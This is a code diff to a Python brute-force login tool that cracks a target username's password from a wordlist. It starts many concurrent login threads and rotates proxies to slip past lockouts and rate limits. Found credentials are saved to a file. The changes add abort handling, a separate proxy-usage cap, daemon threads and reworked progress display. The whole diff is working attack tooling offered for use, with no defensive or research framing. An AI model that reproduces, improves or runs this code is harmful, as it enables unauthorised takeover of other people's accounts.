@@ -9,7 +9,7 @@ from time import time, sleep
 from threading import Thread, Lock
 from os import system, remove, path
 from platform import system as platform
-from .const import max_fails, fetch_time, site_details, credentials
+from .const import max_fails, fetch_time, site_details, max_proxy_usage, credentials
 
 class Bruter(object):
  def __init__(self, username, threads, wordlist):
@@ -19,6 +19,7 @@ class Bruter(object):
   self.proxy_usage_count = 0
   self.wordlist = wordlist
   self.username = username
+  self.user_abort = False
   self.passlist = Queue()
   self.spyder = Spyder()
   self.retrieve = False 
@@ -78,7 +79,9 @@ class Bruter(object):
      self.passlist.queue.pop(self.passlist.queue.index(pwd)) 
      self.attempts += 1
 
-  except KeyboardInterrupt:self.stop()
+  except KeyboardInterrupt:
+   self.user_abort = True 
+   self.stop()
   except:
    with self.lock:self.fails += 1
   finally:
@@ -96,7 +99,7 @@ class Bruter(object):
   self.isAlive = False 
   self.spyder.isAlive = False 
 
- def display(self, pwd, isFound=False): 
+ def display(self, pwd, isFound=False, n=1): 
   if not isFound:system(self.cls)
   else:
    with open(credentials, 'a') as f:
@@ -106,16 +109,19 @@ class Bruter(object):
   ip = '{}[{}]'.format(self.ip, self.spyder.proxy_info['country']) if all([self.ip, self.spyder.proxy_info]) else ''
   
   try:
-   print(('[-] Proxy-IP: {}\n[-] Wordlist: {}\n[-] Username: {}\
-   \n[-] Password: {}\n[-] Attempts: {}\n[-] Proxies: {}'.format(ip, self.wordlist, self.username, pwd,
-                                                                   self.attempts, self.spyder.proxies.qsize) if not isFound
-                                           else '\n[!] Password Found\n[+] Username: {}\n[+] Password: {}'.format(self.username, pwd)))
+   if not isFound:
+    print('[-] Proxy-IP: {}\n[-] Wordlist: {}\n[-] Username: {}\n[-] Password: {}\n[-] Attempts: {}\n[-] Proxies: {}'.
+          format(ip, self.wordlist, self.username, pwd, self.attempts, self.spyder.proxies.qsize))
+    if not n:self.display(pwd, isFound=True)
+   else:
+    if n:self.display(pwd, n-1)
+    print('\n[!] Password Found\n[+] Username: {}\n[+] Password: {}'.format(self.username, pwd))
   except:pass 
 
  def attack(self):
   while all([not self.isFound, self.isAlive]):
    try:
-    if any([not self.ip, self.proxy_usage_count >= self.max_threads, self.fails >= max_fails]):
+    if any([not self.ip, self.proxy_usage_count >= max_proxy_usage, self.fails >= max_fails]):
      try:
       if not self.spyder.proxies.qsize:continue
       self.spyder.renew_proxy()
@@ -124,14 +130,20 @@ class Bruter(object):
       self.proxy_usage_count = 0
       self.fails = 0
       self.ip = ip
-     except KeyboardInterrupt:self.stop()
+     except KeyboardInterrupt:
+      self.user_abort = True 
+      self.stop()
   
     # try all the passwords in the queue
     for pwd in self.passlist.queue:
      if self.threads >= self.max_threads:break
      if any([not self.isAlive, self.isFound]):break
-     if self.proxy_usage_count >= self.max_threads:break
-     Thread(target=self.login, args=[pwd]).start()  
+     if self.proxy_usage_count >= max_proxy_usage:break
+
+     # login thread     
+     login = Thread(target=self.login, args=[pwd])
+     login.daemon = True
+     login.start()  
 
     # wait time 
     started = time() 
@@ -148,7 +160,9 @@ class Bruter(object):
      self.threads = 0
      if all([self.isAlive, not self.isFound]):
       self.session.write(self.attempts, self.passlist.queue)
-   except KeyboardInterrupt:self.stop()
+   except KeyboardInterrupt:
+    self.user_abort = True 
+    self.stop()
    except:pass
 
  def pwd_manager(self):
@@ -158,12 +172,12 @@ class Bruter(object):
     if any([not self.isAlive, self.isFound]):break
 
     if self.retrieve:
-     if attempts < self.attempts:
+     if attempts < (self.attempts + self.passlist.qsize)-1:
       attempts += 1
       continue
      else:self.retrieve = False
 
-    if self.passlist.qsize != self.max_threads:
+    if self.passlist.qsize <= self.max_threads:
      self.passlist.put(pwd.replace('\n', '').replace('\r', '').replace('\t', ''))
     else:
      while all([self.passlist.qsize, not self.isFound, self.isAlive]):pass
@@ -171,22 +185,34 @@ class Bruter(object):
       self.passlist.put(pwd.replace('\n', '').replace('\r', '').replace('\t', ''))
 
   # done reading wordlist
-  self.read = True if all([self.isAlive, self.isFound]) else False 
+  self.read = True if all([not self.user_abort, self.isAlive]) else False 
   while all([not self.isFound, self.isAlive, self.passlist.qsize]):
    try:sleep(1.5)
-   except KeyboardInterrupt:self.stop()
+   except KeyboardInterrupt:
+    self.user_abort = True 
+    self.stop()
   if self.isAlive:self.stop()
 
  def stop(self):
   if any([all([self.read, self.isFound]), all([not self.read, self.isFound]), all([self.read, not self.isFound])]):self.session.delete()
   else:self.session.write(self.attempts, self.passlist.queue)
   self.kill()
+
+ def primary_threads(self):
+  proxy_manager = Thread(target=self.spyder.proxy_manager)
+  proxy_manager.daemon = True
+  proxy_manager.start()
+
+  pwd_manager = Thread(target=self.pwd_manager)
+  pwd_manager.daemon = True
+  pwd_manager.start()
+
+  attack = Thread(target=self.attack)
+  attack.daemon = True
+  attack.start()
  
  def start(self):
-  Thread(target=self.spyder.proxy_manager).start()
-  Thread(target=self.pwd_manager).start()
-  Thread(target=self.attack).start()
-  
+  self.primary_threads()
   while all([not self.isFound, self.isAlive]):
    try:
     if self.isAlive:
@@ -200,4 +226,6 @@ class Bruter(object):
      if not self.spyder.proxy_info:
       print('\n[+] Searching for proxies ...')
      sleep(1.5 if not self.spyder.proxy_info else 0.5)
-   except KeyboardInterrupt:self.stop()
+   except KeyboardInterrupt:
+    self.user_abort = True 
+    self.stop()
